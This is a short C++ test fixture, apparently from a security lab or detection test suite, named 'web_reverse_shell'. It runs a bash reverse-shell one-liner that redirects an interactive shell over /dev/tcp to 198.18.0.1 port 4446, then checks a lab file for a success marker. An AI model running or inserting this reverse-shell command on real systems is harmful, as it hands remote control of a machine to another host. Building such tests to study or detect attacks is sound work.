#include "../common.hpp"
#include "../utility.h"
int main(int argc, char **argv) {
 if (!fixture_begin(argc,argv,"web_reverse_shell")) return 0;
const char *args[] = {"/bin/bash", "-c", "bash -i >& /dev/tcp/198.18.0.1/4446 0>&1", NULL};
launch_verified(args, "", 0, NULL, NULL);
verify_bytes("/tmp/lab/received", "SHELL_OK", 8);
std::cout << "CASE_OK web_reverse_shell\n";
return 0;
}
